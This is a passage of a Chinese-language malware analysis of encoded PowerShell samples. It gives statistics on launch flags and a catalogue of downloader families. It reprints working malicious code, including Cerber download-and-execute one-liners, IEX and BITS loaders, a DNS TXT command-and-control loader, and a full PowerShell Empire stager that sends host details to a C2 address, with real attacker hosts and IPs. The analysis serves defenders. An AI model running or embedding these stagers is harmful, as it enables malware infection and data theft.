alt="http://p6.qhimg.com/t011f4c2cda9a46f9d1.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图5. AutoFocus在过去12个月捕获的恶意PowerShell可执行文件样本数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以上状况的一种可能性是两类样本的分发渠道不同。比如DOC样本主要是通过电子邮件附件进行分发投递，而EXE样本主要是通过Web浏览器进行投递。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在对具体命令分析前，我要说的最后一件事是我们所检测到的使用EncodedCommand技术的一个DLL文件。这个DLL文件不包含导出函数，通过DLLMain入口调用后，该DLL会启动一个PowerShell Empire stager，从网站下载一个经过异或处理的脚本，并使用PowerShell的Invoke-Expression cmdlet运行。该样本与2016年10月Symantec发布的一篇博文中描述的Odinaff恶意软件家族的有关。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">三、数据前期分析及统计</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">开始分析base64编码数据前，我观察了每个进程的启动方式，这种分析方法可以了解与EncodedCommand配合使用的附加参数情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.1 EncodedCommand：（4,100个样本，占比100%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数向PowerShell传递base64编码字符串并运行。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01fabd9e3873a98427.png" title="t01fabd9e3873a98427.png" alt="http://p8.qhimg.com/t01fabd9e3873a98427.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.2 WindowStyle Hidden：（2,083个样本，占比50.8%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数避免PowerShell执行时显示运行窗口。其中“-window hidden”方法使用最多主要与前文提到的Cerber勒索软件有关。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t017d29fe68037a004f.png" title="t017d29fe68037a004f.png" alt="http://p0.qhimg.com/t017d29fe68037a004f.png"/></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0179a0ba7a136a264d.png" title="t0179a0ba7a136a264d.png" alt="http://p1.qhimg.com/t0179a0ba7a136a264d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.3 NonInteractive：（1,405个样本，占比42.4%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数避免显示一个交互对话窗口。此方法与WindowStyle隐藏方法配合使用以隐藏执行痕迹。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其中使用“-noni”的变种中76%是通用型的shellcode注入代码或SET工具，而使用“-NonI”的变种主要是PowerShell Empire工具。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t0171cbc20b25c54d8f.png" title="t0171cbc20b25c54d8f.png" alt="http://p9.qhimg.com/t0171cbc20b25c54d8f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.4 NoProfile：（1,350个样本，占比32.9%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数阻止PowerShell在开机时加载配置文件脚本，以避免载入非预期的命令或设置。与非交互方式类似，“-nop”方法主要由SET和通用型shellcode注入变种采用，而“-NoP”方法主要由PowerShell Empire使用。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0174e7251f6d9c8f54.png" title="t0174e7251f6d9c8f54.png" alt="http://p8.qhimg.com/t0174e7251f6d9c8f54.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.5 ExecutionPolicy ByPass：（453个样本，占比11%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数绕过默认的PowerShell脚本执行策略（即受限策略），可以执行任何代码。有趣的是，使用EncodedCommand参数执行的代码不受执行策略影响。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01ec83fd29e508bd8c.png" title="t01ec83fd29e508bd8c.png" alt="http://p8.qhimg.com/t01ec83fd29e508bd8c.png"/></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0134f62b4584eb885f.png" title="t0134f62b4584eb885f.png" alt="http://p8.qhimg.com/t0134f62b4584eb885f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.6 Sta：（219个样本，占比5.3%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用单线程模式（现在是PowerShell 3.0的默认模式）。此参数基本上是PowerShell Empire在使用。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t0154c233160a26978f.png" title="t0154c233160a26978f.png" alt="http://p2.qhimg.com/t0154c233160a26978f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.7 NoExit: （23个样本，占比0.5%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用此参数阻止PowerShell在运行启动命令后退出。这是PowerWorm恶意软件除EncodedCommand参数外使用的唯一参数。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0179feb47c3baaa8ea.png" title="t0179feb47c3baaa8ea.png" alt="http://p6.qhimg.com/t0179feb47c3baaa8ea.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.8 ExecutionPolicy Hidden（5个样本，占比0.12%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这实际上不是一个有效的参数，因此PowerShell会忽略该参数。使用该参数的每个样本我都标记为与“TXT C2”脚本有关，该脚本试图加载一个包含另一段PowerShell脚本的DNS TXT记录，与PowerWorm类似。可能攻击者本来想使用的是ByPass参数，因为他们的后续命令中使用了“-w hidden”参数。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01c7f0b5992565c422.png" title="t01c7f0b5992565c422.png" alt="http://p1.qhimg.com/t01c7f0b5992565c422.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.9 NoLogo：（33个样本，占比0.8%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">避免PowerShell启动时显示版权信息。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t010a3e2af22e205ff7.png" title="t010a3e2af22e205ff7.png" alt="http://p2.qhimg.com/t010a3e2af22e205ff7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.10 ExecutionPolicy Unrestricted：（1个样本，占比0.02%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">与ByPass类似，但会在运行从Internet下载的未签名脚本前警告用户。使用此参数的脚本在试图执行从Internet下载的脚本时会触发警告信息。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0179a1bea57925770e.png" title="t0179a1bea57925770e.png" alt="http://p5.qhimg.com/t0179a1bea57925770e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.11 Command：（1个样本，占比0.02%）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用该参数可以执行参数后面的命令，就如同直接在PowerShell提示符下输入命令一样。我只捕捉到一个样本，它直接附加到某个恶意软件中，该恶意软件在FireEye发布的一篇关于绕过基于签名的检测方法的博文中提到过。该PowerShell脚本包含在一个DOCM文件的“Comments“域中，通过Word文档的宏加载执行。以下是该样本的恶意PowerShell代码片段，通过将多条命令组合在一起，可以实现FTP传输和NetCat建连目的。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0126b2d7b39e40a0d2.png" title="t0126b2d7b39e40a0d2.png" alt="http://p6.qhimg.com/t0126b2d7b39e40a0d2.png"/></p><p style="text-align:center"><img src="http://p9.qhimg.com/t014894da90bca8b8ee.png" title="t014894da90bca8b8ee.png" alt="http://p9.qhimg.com/t014894da90bca8b8ee.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在，让我们整体看一下样本集中排名前十的PowerShell参数组合。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t010cbf5c7708beaa93.png" title="t010cbf5c7708beaa93.png" alt="http://p7.qhimg.com/t010cbf5c7708beaa93.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">即使将代码的多样性考虑在内，以上排名结果也不会出现太大变化，只是使用某些参数的样本个数有些许改变而已。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在整个研究过程中，我发现有些代码作者对新版本的工具特征进行了修改，如下所示，新版本中作者稍微对参数形式进行了变化：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01b9a70c0e23701186.png" title="t01b9a70c0e23701186.png" alt="http://p3.qhimg.com/t01b9a70c0e23701186.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图6. 代码作者对不同版本样本的参数修改对比</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这种修改会导致变种族群总数的变化，但我认为这些变化不会对总体结果造成特别大的影响。我的调查研究表明，代码作者很少对参数的顺序或长度做出动态改变以混淆其攻击活动，相反，他们更加关注代码基本功能的随机化，也更加关注代码的内在方面。这也使得我们可以使用PowerShell启动参数作为特征对样本进行大致精确的分类。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外，前三种参数使用方式占了样本总数的72%，这也说明攻击者更倾向于简单地执行PowerShell脚本，而不关心后续攻击行动的隐蔽性。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">四、数据后期分析及统计</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来我会讨论识别出来的每个变种类别并分析他们的功能。对具备下载文件或脚本功能的变种，我将它们使用的IP地址/域名/URL信息附在本文末尾。这些地址中有些是恶意性质的，有些是用来做渗透测试的，有些只是人们用来做新技术的随机测试。不幸的是，在大规模批量分析中，我们很难推测每个地址的真实用处，因此我将这些信息直接提供给读者加以鉴别。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);">（一）下载器类别</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类PowerShell代码的主要目的是下载运行远程主机的载荷或PowerShell脚本。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.1 Downloader DFSP（1,373个样本，占比33.49%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是使用PowerShell下载和运行文件的一个典型类别，也基本就是你在使用Google搜索如何利用PowerShell下载和执行文件时所得到的搜索结果。我使用以下模板作为此类样本的筛选器。</span></p><pre class="brush:plain;toolbar:false">(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://cajos[.]in/0x/1.exe&#39;,&#39;mess.exe&#39;);Start-Process&nbsp;&#39;mess.exe&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如前文所述，几乎所有匹配此类别的变种都与恶意Word文档有关，这些文档会通过宏启动PowerShell以下载Cerber恶意软件。此类样本中有个特例，除了使用URI之外，它在路径参数中还使用了环境变量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Cerber下载器代码：</span></p><pre class="brush:plain;toolbar:false">(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://94.102.53[.]238/~yahoo/csrsv.exe&#39;,&quot;$env:APPDATA\csrsv.exe&quot;);Start-Process&nbsp;(&quot;$env:APPDATA\csrsv.exe&quot;)</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.2 PowerShell Empire（293个样本，占比7.15%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种使用PowerShell Empire的EncryptedScriptDropper来下载远程脚本，并使用内置的异或密钥进行解密。</span></p><pre class="brush:plain;toolbar:false">$Wc=NeW-ObjeCt&nbsp;SySTEM.Net.WebCLiEnt;$u=&#39;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;6.1;&nbsp;WOW64;&nbsp;Trident/7.0;&nbsp;rv:11.0)&nbsp;like&nbsp;Gecko&#39;;$WC.HeadeRS.ADd(&#39;User-Agent&#39;,$u);$wc.PrOxy&nbsp;=&nbsp;[SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS&nbsp;=&nbsp;[SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K=&#39;0192023a7bbd73250516f069df18b500&#39;;$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing(&quot;http://23.239.12.15:8080/index.asp&quot;)))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX&nbsp;($B-jOIn&#39;&#39;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">本例中，异或密钥为“0192023a7bbd73250516f069df18b500“，使用该密钥解密后的脚本为PowerShell Empire的stager脚本，其功能是利用POST方式将系统信息提交给C2服务器，并下载Empire的第一阶段载荷。</span></p><pre class="brush:plain;toolbar:false">&#39;FunCtION&nbsp;StaRt-NegoTiATe{param($s,$SK,$UA=&quot;lol&quot;)Add-TypE&nbsp;-AsSeMBLY&nbsp;SYSteM.SECUriTY;AdD-TypE&nbsp;-aSSEMBly&nbsp;SYSTEm.CoRe;$ErrorActionPreference&nbsp;=&nbsp;&quot;SilentlyContinue&quot;;$E=[SYstem.TExT.ENCoDING]::ASCII;$AES=NeW-OBjecT&nbsp;SYsTeM.SeCURiTy.CRyptoGrapHY.AESCRyPToSeRVicePrOvIdER;$IV&nbsp;=&nbsp;[BYTE]&nbsp;0..255&nbsp;|&nbsp;GeT-RandOm&nbsp;-coUNt&nbsp;16;$AES.Mode=&quot;CBC&quot;;&nbsp;$AES.Key=$e.GetBytes($SK);&nbsp;$AES.IV&nbsp;=&nbsp;$IV;$cSp&nbsp;=&nbsp;NEW-OBJECT&nbsp;SYStEM.SecURity.CrYPtOGRAPHy.CSpPaRAmeTERS;$csP.FLAGs&nbsp;=&nbsp;$cSP.FlagS&nbsp;-boR&nbsp;[SYsTeM.SeCurITY.CryptogRaphy.CsPPROViDErFlAGs]::UsEMAcHINEKeySTore;$Rs&nbsp;=&nbsp;NEW-ObJecT&nbsp;SySTEm.SecURIty.CRyptograPHy.RSACRYPTOSERvICEPROViDeR&nbsp;-ARGuMenTLIsT&nbsp;2048,$CSP;$rk=$Rs.TOXMlStriNg($FALse);$r=1..16|FOrEacH-ObJEcT{GEt-RANDOm&nbsp;-MAx&nbsp;26};$ID=(\&#39;ABCDEFGHKLMNPRSTUVWXYZ123456789\&#39;[$r]&nbsp;-joIN&nbsp;\&#39;\&#39;);$iB=$E.gEtbYTes($Rk);$eb=$IV+$AES.CReaTeENCRyptoR().TRANSFoRmFiNalBLOcK($Ib,0,$Ib.LENgtH);IF(-Not&nbsp;$wc){$wc=nEw-oBJECt&nbsp;sYstEM.Net.WEBCLient;$WC.ProxY&nbsp;=&nbsp;[SySTem.NET.WeBReqUEsT]::GETSysTeMWEbPRoxY();$Wc.Proxy.CrEDentIals&nbsp;=&nbsp;[SYStem.Net.CredENtIalCAche]::DEFAUlTCRedentIaLs;}$wc.Headers.Add(&quot;User-Agent&quot;,$UA);$wc.Headers.Add(&quot;Cookie&quot;,&quot;SESSIONID=$ID&quot;);$raw=$wc.UploadData($s+&quot;index.jsp&quot;,&quot;POST&quot;,$eb);$dE=$E.GETSTRing($Rs.deCrYPt($raw,$FalSE));$EpOCh=$de[0..9]&nbsp;-joIN\&#39;\&#39;;$KeY=$dE[10..$de.LengTH]&nbsp;-jOIn&nbsp;\&#39;\&#39;;$AES=NEw-ObJEct&nbsp;SYsTEm.SEcurity.CRyPtoGRAPHY.AEsCrYPtOSerVIcEPRoVidEr;$IV&nbsp;=&nbsp;[ByTe]&nbsp;0..255&nbsp;|&nbsp;GET-RaNdom&nbsp;-couNT&nbsp;16;$AES.Mode=&quot;CBC&quot;;&nbsp;$AES.Key=$e.GetBytes($key);&nbsp;$AES.IV&nbsp;=&nbsp;$IV;$i=$S+\&#39;|\&#39;+[EnvIrONment]::UsERDOmAInNAmE+\&#39;|\&#39;+[ENvIRonmeNt]::UsERNaME+\&#39;|\&#39;+[ENvIRONmeNt]::MaChinEName;$P=(gwMi&nbsp;WIN32_NeTWorkAdAPTErCoNfIGurAtioN|WherE{$_.IPAdDRess}|SelECt&nbsp;-ExpANd&nbsp;IPADDReSS);$ip&nbsp;=&nbsp;@{$TrUe=$P[0];$FalsE=$P}[$P.LeNgTh&nbsp;-lt&nbsp;6];If(!$IP&nbsp;-or&nbsp;$ip.trIm()&nbsp;-EQ&nbsp;\&#39;\&#39;)&nbsp;{$Ip=\&#39;0.0.0.0\&#39;};$i+=&quot;|$ip&quot;;$I+=\&#39;|\&#39;+(GEt-WmIOBJect&nbsp;WIn32_OpERAtiNgSystEM).NAME.splIT(\&#39;|\&#39;)[0];if(([Environment]::UserName).ToLower()&nbsp;-eq&nbsp;&quot;system&quot;){$i+=\&#39;|True\&#39;}else&nbsp;{$i&nbsp;+=&nbsp;&quot;|&quot;&nbsp;+([Security.Principal.WindowsPrincipal]&nbsp;[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]&nbsp;&quot;Administrator&quot;)}$n=[SySTeM.DIAgNoSTICS.ProceSS]::GetCUrREntPRocEss();$i+=\&#39;|\&#39;+$n.PROCEssNAMe+\&#39;|\&#39;+$n.ID;$I&nbsp;+=&nbsp;\&#39;|\&#39;&nbsp;+&nbsp;$PSVerSIOnTabLe.PSVerSioN.MAjOR;$ib2=$E.getbYteS($I);$EB2=$IV+$AES.CrEATEEncrYPToR().TrANSFORmFinALBLOCk($Ib2,0,$Ib2.LenGTH);$wc.Headers.Add(&quot;User-Agent&quot;,$UA);$raw=$wc.UploadData($s+&quot;index.php&quot;,&quot;POST&quot;,$eb2);$AES=NeW-Object&nbsp;SYSteM.SEcuRIty.CRYPToGrapHY.AesCrYPToSeRVIcEProvIder;$AES.Mode=&quot;CBC&quot;;$IV&nbsp;=&nbsp;$rAw[0..15];$AES.Key=$e.GETBYtes($key);$AES.IV&nbsp;=&nbsp;$IV;IEX&nbsp;$([SYstEM.TeXt.EnCoDInG]::ASCII.GetStrInG(&nbsp;$($AES.CrEateDECRYpTOr().TRANsFOrMFinAlBloCk($rAW[16..$RaW.LENGtH],0,$raw.LENGth-16))));$AES=$NuLL;$s2=$NuLl;$WC=$nUll;$eB2=$nULl;$RAW=$NuLl;$IV=$NULL;$WC=$NULl;$I=$NUlL;$iB2=$null;[GC]::COlLEcT();Invoke-Empire&nbsp;-Servers&nbsp;@(($s&nbsp;-split&nbsp;&quot;/&quot;)[0..2]&nbsp;-join&nbsp;&quot;/&quot;)&nbsp;-SessionKey&nbsp;$key&nbsp;-SessionID&nbsp;$ID&nbsp;-Epoch&nbsp;$epoch;}&nbsp;Start-Negotiate&nbsp;-s&nbsp;&quot;http://23.239.12.15:8080/&quot;&nbsp;-SK&nbsp;\&#39;0192023a7bbd73250516f069df18b500\&#39;&nbsp;-UA&nbsp;$u;&#39;</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.3 Downloader DFSP 2X（81个样本，占比1.98%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种与前一类变种一样，但它使用另一个PoweShell实例来执行下载任务。这类变种同样都与Cerber下载器文档有关。</span></p><pre class="brush:plain;toolbar:false">PowerShell&nbsp;-ExecutionPolicy&nbsp;bypass&nbsp;-noprofile&nbsp;-windowstyle&nbsp;hidden&nbsp;-command&nbsp;(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://93.174.94[.]135/~kali/ketty.exe&#39;,&nbsp;$env:APPDATA\profilest.exe&nbsp;);Start-Process&nbsp;(&nbsp;$env:APPDATA\profilest.exe&nbsp;)</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.4 Downloader DFSP DPL（24个样本，占比0.59%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是使用“DownloadFile -&gt; Start-Process“技术的另一类下载器变种，有两种不同表现形式。这类样本中多数与Bartalex有关，可以用来反映这个广为人知的Office宏生成器的最新变化情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完全表现形式：</span></p><pre class="brush:plain;toolbar:false">($deploylocation=$env:temp+&#39;fleeb.exe&#39;);(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://worldnit[.]com/abu.exe&#39;,&nbsp;$deploylocation);Start-Process&nbsp;$deploylocation</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">简略表现形式：</span></p><pre class="brush:plain;toolbar:false">($dpl=$env:temp+&#39;f.exe&#39;);(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://alonqood[.]com/abacom.exe&#39;,&nbsp;$dpl);Start-Process&nbsp;$dpl</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.5 Downloader IEXDS（19个样本，占比0.46%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这也是搜索PowerShell如何下载和执行的常见搜索结果。此类变种简单地从远程下载PowerShell脚本并利用Invoke-Expression加以执行。不同个体所生成的载荷可以完全不同且没有关联。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以下两个样本下载了“Invoke-TwitterBot“脚本，运行该脚本的主机会成为ShmooCon IX僵尸网络所控制的节点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;http://cannot.loginto[.]me/googlehelper.ps1&#39;)
iex&nbsp;((New-Object&nbsp;Net.WebClient).DownloadString(&#39;http://76.74.127[.]38/default-nco.html&#39;))</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.6 BITS Transfer（11个样本，占比0.27%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用PowerShell下载恶意软件的另一种方式是利用BitsTransfer模块。后台智能传输服务（Background Intelligent Transfer Service，BITS）技术通常很少用于恶意软件的下载，但其可以提供与其他传输服务（如HTTP服务）一样的功能。使用这种方法可能允许攻击者规避某些监控策略，并且可以在不影响其他带宽使用条件下完成传输任务。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在我之前的博文中，我提到了Cerber下载器的一类变种，它们使用了BITS技术用来传输文件，这11个变种中有10个与Cerber软件的Word文档有关。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Import-Module&nbsp;BitsTransfer
$path&nbsp;=&nbsp;[environment]::getfolderpath(&quot;mydocuments&quot;)
Start-BitsTransfer&nbsp;-Source&nbsp;&quot;http://94.102.50[.]39/keyt.exe&quot;&nbsp;-Destination&nbsp;&quot;$path\keyt.exe&quot;
Invoke-Item&nbsp;&nbsp;&quot;$path\keyt.exe&quot;</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.7 TXT C2（10个样本，占比0.24%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类样本中，攻击者使用PowerShell发起DNS请求，解析某个域名的TXT记录，该记录包含了另一个PowerShell脚本，通过Invoke-Expression加以执行。</span></p><pre class="brush:plain;toolbar:false">if(&#39;&#39;+(nslookup&nbsp;-q=txt&nbsp;p.s.os.ns.rankingplac[.]pl)&nbsp;-match&nbsp;&#39;@(.*)@&#39;){iex&nbsp;$matches[1]}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">通过以上代码我们可知，脚本发起初始请求后，会循环解析某个域名的TXT记录直至获得请求响应，对响应进行base64解码后再进行执行过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Non-authoritative&nbsp;answer:
p.s.os.ns.rankingplac.pltext&nbsp;=&nbsp;&quot;@$str=&#39;&#39;\;$i=1\;while(1){if(&#39;&#39;+(nslookup&nbsp;-q=txt&nbsp;\&quot;l.$i.ns.rankingplac[.]pl.\&quot;)&nbsp;-match&nbsp;&#39;@(.*)@&#39;){$str&nbsp;+=&nbsp;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))}&nbsp;else&nbsp;{break\;}$i++}iex&nbsp;$str@&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">该代码使得攻击者在条件允许时可以与受害主机建立命令和控制信道。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">微软的John Lambert最近在Twitter上公布了这类变种信息，确定它们只是用来进行渗透测试。该变种的另一个样本也可以在Nishang渗透测试框架中找到。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.8 Downloader Proxy（9个样本，占比0.22%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft 